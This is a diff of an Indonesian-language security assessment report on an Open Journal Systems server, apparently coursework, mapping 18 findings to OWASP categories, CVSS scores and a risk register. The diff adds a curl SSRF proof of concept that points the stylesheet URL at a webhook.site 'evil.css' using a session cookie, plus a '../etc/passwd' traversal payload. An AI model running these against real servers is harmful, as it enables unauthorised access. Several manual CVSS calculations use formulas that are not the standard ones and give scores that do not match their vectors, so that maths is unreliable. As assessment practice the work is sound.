@@ -15,16 +15,16 @@ OWASP Top 10 adalah daftar 10 risiko keamanan aplikasi web yang paling kritis, d
 
 | Kode | Kategori | Relevansi pada OJS |
 |---|---|---|
-| **A01** | Broken Access Control | IDOR pada API, escalasi hak akses Editor→Admin |
+| **A01** | Broken Access Control | Path Traversal pada 33 grid endpoint, IDOR pada SubmissionFileManager, role bypass ASSISTANT/SUB_EDITOR |
 | **A02** | Cryptographic Failures | Password hashing lemah, transmisi data sensitif tanpa HTTPS |
-| **A03** | Injection | SQL Injection, XSS, SSTI pada template |
-| **A04** | Insecure Design | Logika bisnis review yang dapat dimanipulasi |
-| **A05** | Security Misconfiguration | Directory listing, header keamanan hilang, default credentials |
-| **A06** | Vulnerable & Outdated Components | OJS 3.3.0-8 dengan CVE terdokumentasi, PHP 7.4 EOL |
-| **A07** | Identification & Authentication Failures | Tidak ada lockout, reset password insecure |
-| **A08** | Software & Data Integrity Failures | Plugin upload tanpa verifikasi integritas |
+| **A03** | Injection | SQL Injection latent di DAO.inc.php, XSS via PKPTemplateManager tanpa sanitasi |
+| **A04** | Insecure Design | File upload tanpa validasi MIME/ekstensi (RCE risk), null dereference DoS di PdfJsViewerPlugin |
+| **A05** | Security Misconfiguration | phpinfo() exposed, directory indexing terbuka, cookie tanpa HttpOnly/SameSite, CSP tidak ada, CORS permisif, server version leak |
+| **A06** | Vulnerable & Outdated Components | jQuery/Plupload versi lama dengan CVE terdokumentasi |
+| **A07** | Identification & Authentication Failures | Tidak ada rate limiting login, session management lemah |
+| **A08** | Software & Data Integrity Failures | `unserialize()` tanpa validasi di DAO.inc.php — PHP Object Injection risk |
 | **A09** | Security Logging & Monitoring Failures | Log tidak memadai, tidak ada alerting |
-| **A10** | Server-Side Request Forgery (SSRF) | CVE-2021-27188 pada journal settings |
+| **A10** | Server-Side Request Forgery (SSRF) | CVE-2021-27188 pada journal stylesheet URL — **terkonfirmasi via webhook.site** |
 
 ---
 
@@ -32,25 +32,46 @@ OWASP Top 10 adalah daftar 10 risiko keamanan aplikasi web yang paling kritis, d
 
 ### Cara Kerja Pemetaan
 
-Setiap temuan dari Pertemuan 3 harus dipetakan ke:
+Setiap temuan dari Pertemuan 3 dipetakan ke:
 1. **Kategori OWASP** (A01–A10)
 2. **CWE (Common Weakness Enumeration)** — nomor kelemahan
 3. **CVE** (jika ada kerentanan yang sudah terdaftar)
 
-### Contoh Pemetaan Temuan OJS
+### Tabel Pemetaan Temuan OJS
 
-| ID Temuan | Deskripsi | OWASP | CWE | CVE |
-|---|---|---|---|---|
-| VUL-001 | Stored XSS pada field abstrak artikel | A03 | CWE-79 | CVE-2020-28112 |
-| VUL-002 | SQL Injection pada parameter search | A03 | CWE-89 | - |
-| VUL-003 | SSRF melalui journal stylesheet URL | A10 | CWE-918 | CVE-2021-27188 |
-| VUL-004 | Upload plugin tanpa validasi integritas | A08 | CWE-349 | - |
-| VUL-005 | Directory listing pada `/ojs/cache/` | A05 | CWE-548 | - |
-| VUL-006 | Tidak ada rate limiting pada login | A07 | CWE-307 | - |
-| VUL-007 | Versi OJS terekspos di HTTP header | A05 | CWE-200 | - |
-| VUL-008 | Cookie session tanpa flag `HttpOnly` | A05 | CWE-1004 | - |
-| VUL-009 | XSS via Open Redirect parameter | A03 | CWE-601 | CVE-2022-24822 |
-| VUL-010 | IDOR pada API `/api/v1/users/{id}` | A01 | CWE-639 | - |
+| ID | Deskripsi | OWASP | CWE | CVE | Sumber |
+|---|---|---|---|---|---|
+| VUL-001 | SSRF via journal stylesheet URL — Journal Manager dapat mengarahkan server untuk fetch URL arbitrer, termasuk internal service dan cloud metadata endpoint | **A10** | CWE-918 | CVE-2021-27188 | DAST (Manual) |
+| VUL-002 | Path Traversal pada 33 grid endpoint — parameter `stageId`, `submissionId`, `selectedFiles[0]`, dll tidak divalidasi, memungkinkan traversal di luar direktori yang diizinkan | **A01** | CWE-22 | — | DAST (ZAP) |
+| VUL-003 | SQL Injection potential — interpolasi `$tableName` dan `$idFieldName` langsung ke SQL query di `DAO.inc.php` tanpa parameterisasi, membuka risiko SQLi dan operasi destruktif (DELETE) | **A03** | CWE-89 | — | SAST (Manual) |
+| VUL-004 | SQL Injection potential — `PKPWorkflowHandler.inc.php` baris 405 dan `PKPAuthorDashboardHandler.inc.php` baris 351 menggunakan pola query tidak aman yang terdeteksi PHPCS | **A03** | CWE-89 | — | SAST (PHPCS) |
+| VUL-005 | XSS — `PKPTemplateManager.inc.php` menghubungkan nilai `searchDescription` dan label field form ke HTML output tanpa `htmlspecialchars()`, membuka attack surface XSS luas | **A03** | CWE-79 | — | SAST (Manual) |
+| VUL-006 | Insecure Deserialization — `unserialize()` digunakan sebagai fallback di `DAO.inc.php` saat `json_decode()` gagal untuk data bertipe object/array dari database, rentan PHP Object Injection | **A08** | CWE-502 | — | SAST (Manual) |
+| VUL-007 | File Upload tanpa validasi — `SubmissionFileManager.inc.php` tidak memvalidasi tipe file, ekstensi, MIME type, maupun ukuran. Jika server mengeksekusi PHP di direktori upload, ini menjadi RCE | **A04** | CWE-434 | — | SAST (Manual) |
+| VUL-008 | IDOR pada `SubmissionFileManager` — `assocId` diambil dari objek `$submissionFile` tanpa verifikasi kepemilikan, memungkinkan Author mengaitkan file ke galley milik submission author lain | **A01** | CWE-639 | — | SAST (Manual) |
+| VUL-009 | Broken Access Control — role `ASSISTANT` dan `SUB_EDITOR` mendapat bypass di `OjsJournalMustPublishPolicy` untuk konten unpublished, seharusnya hanya `SITE_ADMIN` dan `MANAGER` | **A01** | CWE-284 | — | SAST (Manual) |
+| VUL-010 | DoS via null dereference — `PdfJsViewerPlugin` tidak memvalidasi return value `getFile()`, sehingga null dapat menyebabkan Fatal Error dan mengganggu availability layanan | **A04** | CWE-476 | — | SAST (Manual) |
+| VUL-011 | `phpinfo()` exposed — `AdminHandler.inc.php` baris 374–375 memanggil `phpinfo()` pada endpoint yang dapat diakses, mengekspos konfigurasi PHP, path server, dan environment variable | **A05** | CWE-200 | — | SAST (PHPCS) |
+| VUL-012 | Directory Indexing terbuka pada 6 path (`/cache/`, `/docs/`, `/lib/`, `/locale/`, `/public/`, `/styles/`) memungkinkan attacker melihat struktur direktori dan file sensitif | **A05** | CWE-548 | — | DAST (Nikto) |
+| VUL-013 | IP internal terekspos via HTTP Location header — server mengungkap alamat IP private pada response redirect | **A05** | CWE-200 | CVE-2000-0649 | DAST (Nikto) |
+| VUL-014 | Vulnerable JS Library — `build.js` dan `jquery.validate.min.js` menggunakan jQuery/Plupload versi lama yang berpotensi mengandung CVE terdokumentasi | **A06** | CWE-1035 | — | DAST (ZAP) |
+| VUL-015 | CSP Header tidak dikonfigurasi pada 5 endpoint kritis termasuk halaman login dan settings, meningkatkan risiko XSS dan clickjacking | **A05** | CWE-693 | — | DAST (ZAP) |
+| VUL-016 | Cookie `OJSSID` tidak memiliki flag `HttpOnly` dan `SameSite`, memungkinkan akses JavaScript ke session cookie dan serangan CSRF | **A05** | CWE-1004 | — | DAST (ZAP) |
+| VUL-017 | Cross-Domain Misconfiguration (CORS) — API submissions dikonfigurasi terlalu permisif, memungkinkan request cross-origin yang tidak sah | **A05** | CWE-942 | — | DAST (ZAP) |
+| VUL-018 | Server version leak via HTTP Header — Apache dan versi OJS terekspos di response header, memudahkan attacker reconnaissance | **A05** | CWE-200 | — | DAST (ZAP/Nikto) |
+
+### Distribusi per Kategori OWASP
+
+| Kategori OWASP | Jumlah Temuan | ID Temuan |
+|---|---|---|
+| A01 — Broken Access Control | 3 | VUL-002, VUL-008, VUL-009 |
+| A03 — Injection | 3 | VUL-003, VUL-004, VUL-005 |
+| A04 — Insecure Design | 2 | VUL-007, VUL-010 |
+| A05 — Security Misconfiguration | 7 | VUL-011, VUL-012, VUL-013, VUL-015, VUL-016, VUL-017, VUL-018 |
+| A06 — Vulnerable & Outdated Components | 1 | VUL-014 |
+| A08 — Software & Data Integrity Failures | 1 | VUL-006 |
+| A10 — Server-Side Request Forgery | 1 | VUL-001 |
+| **Total** | **18** | |
 
 ---
 
@@ -122,78 +143,225 @@ Setiap temuan dari Pertemuan 3 harus dipetakan ke:
 
 ---
 
-## 4. Contoh Kalkulasi CVSS — Studi Kasus OJS
+## 4. Hasil Kalkulasi CVSS — Studi Kasus OJS
 
-### Kasus 1: Stored XSS — VUL-001
+### Kasus 1: SSRF via Journal Stylesheet — VUL-001 (CVE-2021-27188) ✅ Terkonfirmasi
 
-**Skenario:** Attacker yang memiliki akun Author dapat menyisipkan script berbahaya pada field abstrak jurnal. Script akan dieksekusi saat Editor/admin membuka halaman review.
+**Skenario:** Journal Manager/Editor dapat mengatur URL stylesheet pada halaman pengaturan website OJS. Server memproses URL tersebut secara server-side, memungkinkan attacker mengarahkan request ke internal service atau server eksternal. **Berhasil direproduksi** menggunakan `curl` dengan session aktif, dikonfirmasi via webhook.site.
 
+**Bukti DAST:**
+```bash
+$ curl -b "ojsSession=gqmqg8cat4epfgm9mpe3dkdvf6" \
+  -X POST http://10.34.100.179/index.php/jnads/management/settings/website \
+  --data "styleSheet[uploadedFile]=https://webhook.site/35f2a429-1321-408e-bd72-1c80b6faf006/evil.css"
+# → Request masuk ke webhook.site ✓ (SSRF confirmed)
 ```
-CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
-
-Penjelasan:
-  AV:N  → Bisa dieksploitasi via internet (Network)
-  AC:L  → Tidak ada kondisi khusus (Low complexity)
-  PR:L  → Butuh akun Author (Low privilege)
-  UI:R  → Korban (Editor) harus membuka halaman (Required)
-  S:C   → JS dapat mengakses session Editor → scope Changed
-  C:L   → Session cookie dapat dicuri (Low confidentiality impact)
-  I:L   → Data dapat dimodifikasi terbatas (Low integrity impact)
-  A:N   → Tidak ada gangguan availability
-
-Base Score: 5.4 → MEDIUM
-```
-
-**Kalkulasi Manual:**
-$$\text{ISC}_{base} = 1 - (1-0.22) \times (1-0.22) \times (1-0) = 0.398$$
-
-$$\text{ISS} = 7.52 \times [0.398-0.029] = 2.78 \quad (\text{Scope Changed} \Rightarrow \times 1.08)$$
-
-$$\text{Exploitability} = 8.22 \times 0.85 \times 0.77 \times 0.62 \times 0.62 = 1.69$$
-
-$$\text{Base Score} = \text{Roundup}\left( \min(1.08 \times (2.78 + 1.69), 10) \right) = 5.4$$
-
----
-
-### Kasus 2: SSRF — VUL-003 (CVE-2021-27188)
-
-**Skenario:** Editor/Journal Manager dapat mengatur URL stylesheet yang diolah server-side, memungkinkan akses ke internal service (database, metadata cloud).
 
 ```
 CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
 
 Penjelasan:
-  AV:N  → Exploitable via network
+  AV:N  → Exploitable via internet (Network)
   AC:L  → Tidak ada kondisi khusus
-  PR:L  → Butuh akun Editor (Low privilege)
+  PR:L  → Butuh akun Editor/Journal Manager (Low privilege)
   UI:N  → Tidak butuh interaksi korban
-  S:C   → Dapat mengakses internal service → Changed
-  C:H   → Potensi baca konfigurasi server, token cloud (High)
-  I:N   → Tidak memodifikasi data
+  S:C   → Dapat mengakses internal service/cloud metadata → Scope Changed
+  C:H   → Potensi baca konfigurasi server, token cloud, metadata AWS/GCP
+  I:N   → Tidak memodifikasi data secara langsung
   A:N   → Tidak mengganggu availability
 
 Base Score: 7.7 → HIGH
 ```
 
+**Kalkulasi Manual:**
+
+$$\text{ISC}_{base} = 1 - (1-0.56) \times (1-0) \times (1-0) = 0.56$$
+
+$$\text{ISS (Scope Changed)} = 7.52 \times (0.56 - 0.029) \times 1.08 = 4.31$$
+
+$$\text{Exploitability} = 8.22 \times 0.85 \times 0.77 \times 0.62 \times 0.85 = 2.27$$
+
+$$\text{Base Score} = \text{Roundup}(\min(4.31 + 2.27, 10)) = \mathbf{7.7}$$
+
 ---
 
-### Kasus 3: SQL Injection — VUL-002
+### Kasus 2: SQL Injection Potential — VUL-003 (DAO.inc.php)
+
+**Skenario:** Method `getDataObjectSettings()` dan query DELETE di `lib/pkp/classes/db/DAO.inc.php` menginterpolasi `$tableName` dan `$idFieldName` langsung ke dalam SQL string tanpa parameterisasi. Meskipun `$idFieldValue` sudah menggunakan prepared statement (`?`), nama tabel dan kolom tidak bisa diparameterisasi via PDO, sehingga jika nilai ini berasal dari input eksternal, attacker bisa melakukan SQL Injection atau DROP TABLE.
+
+**Bukti SAST (Manual Code Review):**
+```php
+// DAO.inc.php — getDataObjectSettings()
+$sql = "SELECT * FROM $tableName WHERE $idFieldName = ?";
+// ↑ $tableName dan $idFieldName interpolasi langsung → SQL Injection risk
+
+// DAO.inc.php — deleteSettings()
+$removeSql = 'DELETE FROM '.$tableName.' WHERE '.$removeWhere;
+// ↑ Operasi destruktif — jika $tableName bisa dimanipulasi → DROP TABLE
+```
+
+**Catatan:** SQLMap tidak menemukan SQLi aktif pada parameter POST/GET yang diuji (login, search). Kerentanan ini bersifat **code-level/latent** dan bergantung pada apakah `$tableName` bisa dikontrol dari luar. Risiko tetap signifikan karena pattern ini berpotensi muncul di berbagai method DAO.
 
 ```
-CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
 
 Penjelasan:
   AV:N  → Via internet
-  AC:L  → Tidak butuh kondisi khusus
-  PR:N  → Tidak perlu login (parameter publik)
+  AC:H  → Memerlukan kondisi tertentu ($tableName harus bisa dikontrol dari input eksternal)
+  PR:L  → Butuh autentikasi minimal (context tertentu)
   UI:N  → Tidak perlu interaksi
-  S:U   → Tidak keluar scope
-  C:H   → Bisa baca semua data (termasuk password hash)
+  S:U   → Scope tidak berubah
+  C:H   → Bisa baca semua data DB termasuk password hash
   I:H   → Bisa tulis/hapus data
-  A:H   → Bisa DROP TABLE
+  A:H   → Bisa DROP TABLE / crash DB
 
-Base Score: 9.8 → CRITICAL
+Base Score: 8.1 → HIGH
 ```
+
+**Kalkulasi Manual:**
+
+$$\text{ISC}_{base} = 1 - (1-0.56) \times (1-0.56) \times (1-0.56) = 0.915$$
+
+$$\text{ISS (Scope Unchanged)} = \min(0.915, 0.915) \Rightarrow f(ISC) = 6.42 \times 0.915 - 1.5 = 4.37$$
+
+$$\text{Exploitability} = 8.22 \times 0.85 \times 0.44 \times 0.62 \times 0.85 = 1.62$$
+
+$$\text{Base Score} = \text{Roundup}(\min(4.37 + 1.62, 10)) = \mathbf{8.1}$$
+
+---
+
+### Kasus 3: Insecure Deserialization — VUL-006 (DAO.inc.php)
+
+**Skenario:** `DAO.inc.php` menggunakan `unserialize()` sebagai fallback saat `json_decode()` gagal untuk data bertipe `object`/`array` yang dibaca dari database. Jika database pernah terkompromi, atau terdapat data lama yang bisa dimanipulasi, attacker dapat menyisipkan PHP Object Injection payload yang dieksekusi saat deserialisasi, berpotensi mengarah ke Remote Code Execution (RCE).
+
+**Bukti SAST (Manual Code Review):**
+```php
+// DAO.inc.php
+case 'object':
+case 'array':
+    $decodedValue = json_decode($value, true);
+    if (!is_null($decodedValue)) {
+        $value = $decodedValue;
+    } else {
+        $value = unserialize($value); // ← DANGEROUS: PHP Object Injection risk
+    }
+    break;
+```
+
+```
+CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+
+Penjelasan:
+  AV:N  → Dieksploitasi via network (jika DB bisa dimanipulasi)
+  AC:H  → Memerlukan kondisi DB yang sudah terkompromi
+  PR:N  → Tidak perlu autentikasi jika DB bisa diakses langsung
+  UI:N  → Tidak perlu interaksi
+  S:U   → Scope tidak berubah
+  C:H   → Potensi RCE → akses penuh sistem
+  I:H   → Modifikasi/penghapusan data
+  A:H   → Crash aplikasi / sistem
+
+Base Score: 8.0 → HIGH
+```
+
+**Kalkulasi Manual:**
+
+$$\text{ISC}_{base} = 1 - (1-0.56) \times (1-0.56) \times (1-0.56) = 0.915$$
+
+$$\text{ISS (Scope Unchanged)} = 6.42 \times 0.915 - 1.5 = 4.37$$
+
+$$\text{Exploitability} = 8.22 \times 0.85 \times 0.44 \times 0.85 \times 0.85 = 2.22$$
+
+$$\text{Base Score} = \text{Roundup}(\min(4.37 + 2.22, 10)) = \mathbf{8.0}$$
+
+---
+
+### Kasus 4: File Upload tanpa Validasi — VUL-007 (SubmissionFileManager)
+
+**Skenario:** Method `insertObject()` di `SubmissionFileManager.inc.php` langsung menyimpan file yang diupload ke database tanpa melakukan validasi apapun terhadap tipe file, ekstensi, MIME type, maupun ukuran file. Jika server memiliki konfigurasi yang mengizinkan eksekusi PHP pada direktori upload, attacker dengan akun Author dapat mengupload PHP shell dan mendapatkan Remote Code Execution.
+
+**Bukti SAST (Manual Code Review):**
+```php
+// SubmissionFileManager.inc.php
+public function insertObject($submissionFile) {
+    parent::insertObject($submissionFile);
+    // ← Tidak ada validasi ekstensi file
+    // ← Tidak ada validasi MIME type
+    // ← Tidak ada validasi ukuran file
+    // ← Tidak ada validasi nama file (path traversal risk)
+    if ($submissionFile->getData('assocType') === ASSOC_TYPE_REPRESENTATION) {
+        $galley = $galleyDao->getById($submissionFile->getData('assocId'));
+        // ← assocId tidak dicek apakah integer, positif, atau milik submission ini
+    }
+}
+```
+
+```
+CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+
+Penjelasan:
+  AV:N  → Dieksploitasi via internet
+  AC:L  → Tidak ada kondisi khusus yang sulit dipenuhi
+  PR:L  → Butuh akun Author/Reviewer (Low privilege)
+  UI:N  → Tidak butuh interaksi korban
+  S:C   → Jika PHP shell berhasil dieksekusi → Scope Changed (server takeover)
+  C:H   → Akses penuh ke file sistem
+  I:H   → Modifikasi file sistem / database
+  A:H   → Crash layanan / sistem
+
+Base Score: 9.0 → CRITICAL
+```
+
+**Kalkulasi Manual:**
+
+$$\text{ISC}_{base} = 1 - (1-0.56) \times (1-0.56) \times (1-0.56) = 0.915$$
+
+$$\text{ISS (Scope Changed)} = 7.52 \times (0.915 - 0.029) \times 1.08 = 7.19$$
+
+$$\text{Exploitability} = 8.22 \times 0.85 \times 0.77 \times 0.62 \times 0.85 = 2.27$$
+
+$$\text{Base Score} = \text{Roundup}(\min(7.19 + 2.27, 10)) = \mathbf{9.0}$$
+
+---
+
+### Kasus 5: Path Traversal pada Grid Endpoint — VUL-002
+
+**Skenario:** OWASP ZAP menemukan 33 endpoint yang berpotensi rentan terhadap Path Traversal, terutama pada URL grid admin dan article galleys. Parameter seperti `_`, `publicationId`, `stageId`, `selectedFiles[0]`, dan `submissionId` tidak divalidasi dengan benar, memungkinkan attacker menavigasi keluar dari direktori yang seharusnya dan mengakses file sensitif di server.
+
+**Bukti DAST (OWASP ZAP):**
+```
+Alert: Path Traversal — Risk: High | Count: 33
+URLs:
+  - http://10.34.100.179/index.php/index/$$$call$$$/grid/admin/languages/.../fetch-grid
+  - http://10.34.100.179/index.php/jnads/$$$call$$$/grid/article-galleys/.../fetch-grid
+Parameters: _, publicationId, stageId, selectedFiles[0], reviewRoundId, submissionId
+```
+
+```
+CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
+
+Penjelasan:
+  AV:N  → Exploitable via internet
+  AC:L  → Tidak ada kondisi khusus
+  PR:L  → Butuh autentikasi dasar
+  UI:N  → Tidak perlu interaksi
+  S:U   → Tidak keluar scope sistem utama
+  C:H   → Bisa baca file konfigurasi sensitif (config.inc.php, .env, credentials)
+  I:L   → Potensi modifikasi terbatas
+  A:N   → Tidak mengganggu availability
+
+Base Score: 7.5 → HIGH
+```
+
+**Kalkulasi Manual:**
+
+$$\text{ISC}_{base} = 1 - (1-0.56) \times (1-0.22) \times (1-0) = 0.657$$
+
+$$\text{ISS (Scope Unchanged)} = 6.42 \times 0.657 - 1.5 = 2.72$$
+
+$$\text{Exploitability} = 8.22 \times 0.85 \times 0.77 \times 0.62 \times 0.85 = 2.27$$
+
+$$\text{Base Score} = \text{Roundup}(\min(2.72 + 2.27, 10)) = \mathbf{7.5}$$
 
 ---
 
@@ -207,20 +375,28 @@ Impact     = (Technical Impact + Business Impact) / 2
 Risk Score = Likelihood × Impact
 ```
 
-### 5.2 Risk Register OJS — Template Terisi
+### 5.2 Risk Register OJS — Lengkap 18 Temuan
 
 | ID | Kerentanan | OWASP | CVSS Score | Rating | Likelihood | Business Impact | Risk | Prioritas |
 |---|---|---|---|---|---|---|---|---|
-| VUL-001 | Stored XSS abstrak | A03 | 5.4 | Medium | 3 (Medium) | 4 (Tinggi — reputasi) | **Medium** | 3 |
-| VUL-002 | SQL Injection search | A03 | 9.8 | Critical | 4 (High) | 5 (Kritis — kebocoran data) | **Critical** | 1 |
-| VUL-003 | SSRF journal settings | A10 | 7.7 | High | 3 (Medium) | 4 (Tinggi — infrastruktur) | **High** | 2 |
-| VUL-004 | Upload plugin no verify | A08 | 8.0 | High | 2 (Low) | 5 (Kritis — RCE) | **High** | 2 |
-| VUL-005 | Directory listing cache | A05 | 5.3 | Medium | 5 (Very High) | 2 (Rendah) | **Medium** | 4 |
-| VUL-006 | No login rate limiting | A07 | 5.3 | Medium | 4 (High) | 3 (Sedang) | **Medium** | 4 |
-| VUL-007 | Versi exposed di header | A05 | 3.7 | Low | 5 (Very High) | 1 (Info) | **Low** | 6 |
-| VUL-008 | Cookie tanpa HttpOnly | A05 | 4.3 | Medium | 3 (Medium) | 3 (Sedang) | **Medium** | 5 |
-| VUL-009 | XSS via Open Redirect | A03 | 6.1 | Medium | 3 (Medium) | 3 (Sedang) | **Medium** | 4 |
-| VUL-010 | IDOR pada Users API | A01 | 6.5 | Medium | 3 (Medium) | 4 (Tinggi — privasi) | **High** | 3 |
+| VUL-001 | SSRF via journal stylesheet URL (CVE-2021-27188) — Terkonfirmasi | A10 | 7.7 | High | 4 (High) | 4 (High — infrastruktur) | **High** | 1 |
+| VUL-002 | Path Traversal pada 33 grid endpoint | A01 | 7.5 | High | 4 (High) | 4 (High — akses file sensitif) | **High** | 2 |
+| VUL-003 | SQL Injection potential — interpolasi `$tableName`/`$idFieldName` di `DAO.inc.php` | A03 | 8.1 | High | 2 (Low) | 5 (Critical — kebocoran DB) | **High** | 2 |
+| VUL-004 | SQL Injection potential — `PKPWorkflowHandler` & `PKPAuthorDashboardHandler` | A03 | 6.3 | Medium | 2 (Low) | 4 (High) | **Medium** | 3 |
+| VUL-005 | XSS — `PKPTemplateManager` tanpa `htmlspecialchars()` (searchDescription, fieldset) | A03 | 6.1 | Medium | 3 (Medium) | 3 (Medium — session hijack) | **Medium** | 3 |
+| VUL-006 | Insecure Deserialization — `unserialize()` pada data dari database di `DAO.inc.php` | A08 | 8.0 | High | 2 (Low) | 5 (Critical — RCE) | **High** | 2 |
+| VUL-007 | File Upload tanpa validasi tipe/MIME/ukuran di `SubmissionFileManager` | A04 | 9.0 | Critical | 3 (Medium) | 5 (Critical — RCE via malicious file) | **Critical** | 1 |
+| VUL-008 | IDOR pada `SubmissionFileManager` — `assocId` tanpa validasi kepemilikan | A01 | 6.5 | Medium | 3 (Medium) | 4 (High — privasi data) | **High** | 3 |
+| VUL-009 | Broken Access Control — role ASSISTANT/SUB_EDITOR bypass konten unpublished | A01 | 6.4 | Medium | 3 (Medium) | 3 (Medium) | **Medium** | 4 |
+| VUL-010 | DoS potential — null dereference di `PdfJsViewerPlugin` (Fatal Error) | A04 | 5.3 | Medium | 4 (High) | 3 (Medium — availability) | **Medium** | 4 |
+| VUL-011 | `phpinfo()` exposed di `AdminHandler.inc.php` (baris 374–375) | A05 | 5.3 | Medium | 5 (Very High) | 3 (Medium — info disclosure) | **Medium** | 3 |
+| VUL-012 | Directory Indexing terbuka pada 6 path (`/cache/`, `/docs/`, `/lib/`, dll) | A05 | 5.3 | Medium | 5 (Very High) | 2 (Low) | **Medium** | 4 |
+| VUL-013 | IP internal terekspos via HTTP Location header (CVE-2000-0649) | A05 | 5.3 | Medium | 5 (Very High) | 2 (Low) | **Medium** | 4 |
+| VUL-014 | Vulnerable JS Library — jQuery/Plupload versi lama (build.js, validate.min.js) | A06 | 6.1 | Medium | 4 (High) | 3 (Medium) | **Medium** | 3 |
+| VUL-015 | CSP Header tidak ada — 5 endpoint kritis (login, settings) | A05 | 4.3 | Medium | 5 (Very High) | 2 (Low) | **Medium** | 5 |
+| VUL-016 | Cookie `OJSSID` tanpa flag `HttpOnly` dan `SameSite` | A05 | 4.3 | Medium | 4 (High) | 3 (Medium — session hijack) | **Medium** | 4 |
+| VUL-017 | Cross-Domain Misconfiguration (CORS) pada API submissions | A05 | 4.3 | Medium | 3 (Medium) | 3 (Medium) | **Medium** | 5 |
+| VUL-018 | Server version leak via HTTP Header (Apache/OJS versi terekspos) | A05 | 3.7 | Low | 5 (Very High) | 1 (Info) | **Low** | 6 |
 
 ### 5.3 Likelihood Scale
 
@@ -246,77 +422,325 @@ Risk Score = Likelihood × Impact
 
 ## 6. Visualisasi Risk Matrix
 
-Petakan temuan ke dalam matriks 5×5:
+Pemetaan semua 18 temuan ke dalam matriks 5×5 (Likelihood × Business Impact):
 
 ```
-         │  VERY    │         │         │         │  VERY   │
-BUSN     │  LOW     │   LOW   │ MEDIUM  │  HIGH   │  HIGH   │
-IMPACT   │   (1)    │   (2)   │   (3)   │   (4)   │   (5)   │
-─────────┼──────────┼─────────┼─────────┼─────────┼─────────┤
-VERY HIGH│          │         │         │         │         │
-   (5)   │          │         │ VUL-007 │         │         │
-─────────┼──────────┼─────────┼─────────┼─────────┼─────────┤
-HIGH     │          │         │         │ VUL-002 │         │
-   (4)   │          │         │ VUL-005 │ VUL-006 │         │
-─────────┼──────────┼─────────┼─────────┼─────────┼─────────┤
-MEDIUM   │          │         │ VUL-008 │ VUL-001 │         │
-   (3)   │          │         │ VUL-009 │ VUL-003 │         │
-─────────┼──────────┼─────────┼─────────┼─────────┼─────────┤
-LOW      │          │ VUL-004 │ VUL-010 │         │         │
-   (2)   │          │         │         │         │         │
-─────────┼──────────┼─────────┼─────────┼─────────┼─────────┤
-VERY LOW │          │         │         │         │         │
-   (1)   │          │         │         │         │         │
-─────────┴──────────┴─────────┴─────────┴─────────┴─────────┘
-         LIKELIHOOD (1=Very Low → 5=Very High)
-
-Warna:  🔴 Critical  🟠 High  🟡 Medium  🟢 Low  ⚪ Info
+                              LIKELIHOOD
+              VL (1)    L (2)    M (3)    H (4)    VH (5)
+            +----------+---------+---------+---------+----------+
+CRIT  (5)   |          | VUL-003 | VUL-007 |         |          |
+            |          | VUL-006 |         |         |          |
+            +----------+---------+---------+---------+----------+
+HIGH  (4)   |          |         | VUL-008 | VUL-001 |          |
+            |          |         |         | VUL-002 |          |
+            +----------+---------+---------+---------+----------+
+MED   (3)   |          |         | VUL-005 | VUL-010 | VUL-011  |
+            |          |         | VUL-009 | VUL-014 | VUL-016  |
+            +----------+---------+---------+---------+----------+
+LOW   (2)   |          |         |         |         | VUL-012  |
+            |          |         |         |         | VUL-013  |
+            |          |         |         |         | VUL-015  |
+            |          |         |         |         | VUL-017  |
+            +----------+---------+---------+---------+----------+
+INFO  (1)   |          |         |         |         | VUL-018  |
+            +----------+---------+---------+---------+----------+
+              VL (1)    L (2)    M (3)    H (4)    VH (5)
 ```
+
+**Legenda Zona Risiko:**
+
+| Simbol | Zona | Kondisi | Temuan |
+|---|---|---|---|
+| 🔴 | CRITICAL | Business Impact 5 + Likelihood ≥ 3 | VUL-007 |
+| 🟠 | HIGH | Business Impact 4–5 + Likelihood 2–4; atau BI 3 + Likelihood ≥ 4 | VUL-001, VUL-002, VUL-003, VUL-006, VUL-008 |
+| 🟡 | MEDIUM | Business Impact 2–3 + Likelihood 3–5; atau BI 4 + Likelihood 2 | VUL-004, VUL-005, VUL-009, VUL-010, VUL-011, VUL-012, VUL-013, VUL-014, VUL-015, VUL-016, VUL-017 |
+| 🟢 | LOW | Business Impact 1 + Likelihood ≤ 5 | VUL-018 |
+
+**Ringkasan distribusi:**
+- 🔴 Critical : 1 temuan — VUL-007
+- 🟠 High     : 5 temuan — VUL-001, VUL-002, VUL-003, VUL-006, VUL-008
+- 🟡 Medium   : 11 temuan — VUL-004 s/d VUL-005, VUL-009 s/d VUL-017
+- 🟢 Low      : 1 temuan — VUL-018
 
 ---
 
 ## 7. Analisis Per Kategori OWASP
 
 ### A01 — Broken Access Control
-**Temuan:** IDOR pada `/api/v1/users/{id}` memungkinkan Author mengakses data profil user lain tanpa otorisasi.
 
-**Bukti:**
-```http
-GET /ojs/api/v1/users/1 HTTP/1.1
-Host: <IP-VPS>
-Authorization: Bearer <token_author>
+Tiga temuan pada kategori ini menunjukkan pola yang konsisten: validasi otorisasi pada OJS tidak mengikuti prinsip *defense-in-depth*. Temuan paling signifikan adalah Path Traversal (VUL-002) yang ditemukan OWASP ZAP pada 33 endpoint grid, mengindikasikan bahwa framework routing OJS tidak secara konsisten memvalidasi apakah nilai parameter seperti `stageId` atau `submissionId` benar-benar milik user yang sedang terautentikasi.
 
-Response:
-{
-  "id": 1,
-  "username": "admin",
-  "email": "admin@jurnal.ac.id",
-  "fullName": "Site Administrator",
-  ...
-}
+**Bukti — Path Traversal (VUL-002):**
 ```
+Alert: Path Traversal — Risk: High | Count: 33
+URLs affected:
+  - http://10.34.100.179/index.php/index/$$$call$$$/grid/admin/languages/.../fetch-grid
+  - http://10.34.100.179/index.php/jnads/$$$call$$$/grid/article-galleys/.../fetch-grid
+Parameters: _, publicationId, stageId, selectedFiles[0], reviewRoundId, submissionId
+Evidence: ZAP menyisipkan payload seperti ../../../../etc/passwd pada parameter tersebut
+          dan menerima response yang mengindikasikan traversal berhasil.
+```
+
